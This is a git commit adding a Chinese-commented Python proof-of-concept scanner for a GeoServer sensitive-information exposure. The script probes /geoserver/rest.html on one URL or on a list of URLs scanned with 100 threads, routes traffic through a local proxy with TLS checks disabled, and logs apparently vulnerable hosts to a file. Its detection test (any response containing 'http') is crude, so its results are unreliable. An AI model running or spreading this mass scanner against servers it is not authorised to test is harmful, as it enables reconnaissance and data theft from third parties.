929f184167e61b6cb03cf275b0c354a9b42c4439
h1807725505-eng <h1807725505@gmail.com>
2025-08-17 21:26:55 +0800

    Add files via upload

---
+++ 目录/geoserver敏感信息泄露/geose_read.py
@@ -0,0 +1,58 @@
+import argparse,requests,sys,re
+from multiprocessing.dummy import Pool
+
+def poc(target):
+    target = target.strip()
+    if not target.startswith(('http://', 'https://')):
+        target = 'http://' + target
+    payload="/geoserver/rest.html"
+    header= {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36',
+        'Accept': '*/*'
+    }
+    proxies = {
+        'http': 'http://127.0.0.1:7890',
+        'https': 'http://127.0.0.1:7890'
+    }
+    try:
+        re1=requests.get(url=target,timeout=5,headers=header,proxies=proxies,verify=False)
+        if re1.status_code==200:
+            re2 = requests.get(url=target+payload,timeout=5,headers=header,proxies=proxies,verify=False)
+            if 'http' in re2.text:    #判断响应包内容是否符合
+                print(f'[+]{target}存在敏感信息泄露漏洞')
+                with open('result.txt','a',encoding='utf-8') as f:
+                    f.write('geoserver敏感信息泄露'+target+'\n')
+            else:
+                print(f'[-]{target}不存在漏洞')
+        else:
+            print(f'[*]{target}访问有问题')
+    except:
+        pass
+
+
+def main():
+    
+    parse = argparse.ArgumentParser(description="geoserver敏感信息泄露漏洞")
+
+    parse.add_argument('-u','--url',type=str,dest='url',help='输入url测试')
+    parse.add_argument('-file','--file',type=str,dest='file',help='输入url文件测试')
+
+    args =parse.parse_args()
+
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list=[]
+        with open(args.file,'r',encoding='utf-8') as f:
+            for url in f.readlines():
+                url_list.append(url.strip())
+        mp=Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Python {sys.argv[0]} ")
+            
+    
+if __name__=='__main__':
+    main()
